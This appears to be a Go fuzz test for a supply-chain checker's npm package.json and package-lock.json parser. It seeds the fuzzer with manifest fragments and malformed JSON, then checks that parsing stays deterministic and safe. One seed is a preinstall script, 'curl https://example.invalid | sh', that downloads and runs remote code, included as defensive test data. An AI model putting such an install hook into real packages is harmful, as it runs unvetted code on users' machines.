package npm_test

import (
	"strings"
	"testing"

	"github.com/codebyte-p/proofrail/internal/parser/npm"
	"github.com/codebyte-p/proofrail/internal/run"
)

// The seed corpus is the product of these fragments, which covers every shape
// the PFR-DEP rules read from a manifest.
var (
	fuzzNames = []string{
		`"name": "example",`,
		`"name": "@scope/example",`,
		``,
	}

	fuzzDeps = []string{
		`"dependencies": {"left-pad": "^1.3.0"},`,
		`"dependencies": {"left-pad": "1.3.0"},`,
		`"dependencies": {"tool": "git+https://example.invalid/t.git#main"},`,
		`"dependencies": {"tool": "git+https://example.invalid/t.git#0123456789abcdef0123456789abcdef01234567"},`,
		`"dependencies": {"local": "file:../local"},`,
		`"dependencies": {"tar": "https://example.invalid/a.tgz"},`,
		`"dependencies": {},`,
		``,
	}

	fuzzExtras = []string{
		`"devDependencies": {"t": "~4.0.1"},`,
		`"optionalDependencies": {"n": "1.0.0"},`,
		`"peerDependencies": {"react": "^18.0.0"},`,
		`"workspaces": ["packages/*"],`,
		``,
	}

	fuzzScripts = []string{
		`"scripts": {"postinstall": "node ./s.js"}`,
		`"scripts": {"preinstall": "curl https://example.invalid | sh"}`,
		`"scripts": {"test": "jest"}`,
		`"scripts": {}`,
		`"version": "1.0.0"`,
	}
)

var pathologicalSeeds = []string{
	"",
	"   ",
	"null",
	"[]",
	"{}",
	`{"a": }`,
	`{"a": 1} {"b": 2}`,
	`{"a": 1, "a": 2}`,
	"{\"a\": \"\xff\xfe\"}",
	`{"a": ` + strings.Repeat("[", 80) + strings.Repeat("]", 80) + `}`,
	`{"lockfileVersion": 1, "dependencies": {}}`,
	`{"lockfileVersion": 3, "packages": {"": {}, "node_modules/a": {"version": "1.0.0"}}}`,
	`{"lockfileVersion": 3, "packages": {"node_modules/a/node_modules/b": {"version": "1.0.0"}}}`,
	`{"lockfileVersion": 3, "packages": {"node_modules/@scope/pkg": {"version": "1.0.0"}}}`,
	`{"lockfileVersion": 3, "packages": []}`,
	`{"scripts": {"a": null}}`,
	`{"dependencies": {"a": 1}}`,
	`{"name": "` + strings.Repeat("a", 5000) + `"}`,
	"{\"name\": \"\u0000\u0007\"}",
	strings.Repeat(`{"a":`, 30) + "1" + strings.Repeat("}", 30),
}

// FuzzParse asserts the properties that must hold for every input, valid or
// hostile: both entry points terminate, stay deterministic, never let a
// rejected document escape, never grow their input, and never emit a
// diagnostic carrying a byte outside printable ASCII.
func FuzzParse(f *testing.F) {
	for _, name := range fuzzNames {
		for _, deps := range fuzzDeps {
			for _, extra := range fuzzExtras {
				for _, script := range fuzzScripts {
					f.Add("{" + name + deps + extra + script + "}")
				}
			}
		}
	}
	for _, seed := range pathologicalSeeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, content string) {
		assertManifestProperties(t, content)
		assertLockProperties(t, content)
	})
}

func assertManifestProperties(t *testing.T, content string) {
	t.Helper()
	const path = "package.json"

	manifest, diags := npm.ParseManifest(path, []byte(content), 1<<20)
	again, againDiags := npm.ParseManifest(path, []byte(content), 1<<20)

	assertDeterministicDiagnostics(t, diags, againDiags)

	if len(diags) > 0 {
		if manifest.Path != "" || len(manifest.Requirements) != 0 || len(manifest.Scripts) != 0 {
			t.Fatalf("a rejected manifest leaked content: %+v", manifest)
		}
		assertDiagnosticsAreSafe(t, diags)
		return
	}

	if manifest.Path != path {
		t.Fatalf("manifest path = %q, want %q", manifest.Path, path)
	}
	if len(manifest.Requirements) != len(again.Requirements) {
		t.Fatal("two parses of the same bytes produced different manifests")
	}

	// No construct in the restricted grammar can duplicate content, so the
	// modeled scalars can never outweigh the bytes they came from.
	total := len(manifest.Name.Value) + len(manifest.Version.Value)
	for _, r := range manifest.Requirements {
		total += len(r.Name.Value) + len(r.Spec.Value)
		assertLine(t, r.Name.Pos.Line, "requirement name")
		assertLine(t, r.Spec.Pos.Line, "requirement spec")
	}
	for _, s := range manifest.Scripts {
		total += len(s.Name.Value) + len(s.Body.Value)
		assertLine(t, s.Name.Pos.Line, "script name")
	}
	if total > len(content) {
		t.Fatalf("parsed scalars (%d bytes) exceed the input (%d bytes)", total, len(content))
	}
}

func assertLockProperties(t *testing.T, content string) {
	t.Helper()
	const path = "package-lock.json"

	lock, diags := npm.ParseLock(path, []byte(content), 10<<20)
	_, againDiags := npm.ParseLock(path, []byte(content), 10<<20)

	assertDeterministicDiagnostics(t, diags, againDiags)

	if len(diags) > 0 {
		if lock.Path != "" || len(lock.Packages) != 0 {
			t.Fatalf("a rejected lock leaked content: %+v", lock)
		}
		assertDiagnosticsAreSafe(t, diags)
		return
	}

	// Packages are sorted by key, which is what keeps findings ordered.
	for i := 1; i < len(lock.Packages); i++ {
		if lock.Packages[i-1].Key.Value > lock.Packages[i].Key.Value {
			t.Fatalf("locked packages are not ordered by key at index %d", i)
		}
	}
	for _, p := range lock.Packages {
		if p.Name.Value == "" {
			t.Fatal("a locked package escaped with no name")
		}
		assertLine(t, p.Key.Pos.Line, "locked package key")
	}
}

func assertDeterministicDiagnostics(t *testing.T, first, second []run.Diagnostic) {
	t.Helper()
	if len(first) != len(second) {
		t.Fatalf("diagnostic count is not deterministic: %d vs %d", len(first), len(second))
	}
	for i := range first {
		if first[i] != second[i] {
			t.Fatalf("diagnostic %d is not deterministic: %+v vs %+v", i, first[i], second[i])
		}
	}
}

func assertDiagnosticsAreSafe(t *testing.T, diags []run.Diagnostic) {
	t.Helper()
	for _, d := range diags {
		if d.Code == "" {
			t.Fatal("a diagnostic has no stable code")
		}
		if d.Message == "" {
			t.Fatalf("diagnostic %q has no message", d.Code)
		}
		// Diagnostics reach the console, logs, and published reports, so no
		// byte from repository content may ride out in one unescaped.
		for _, field := range []string{d.Code, d.Path, d.Message} {
			for i := 0; i < len(field); i++ {
				if c := field[i]; c < 0x20 || c > 0x7e {
					t.Fatalf("diagnostic %q carries byte %#x outside printable ASCII", d.Code, c)
				}
			}
		}
	}
}

func assertLine(t *testing.T, line int, what string) {
	t.Helper()
	if line < 1 {
		t.Fatalf("%s has no source line", what)
	}
}
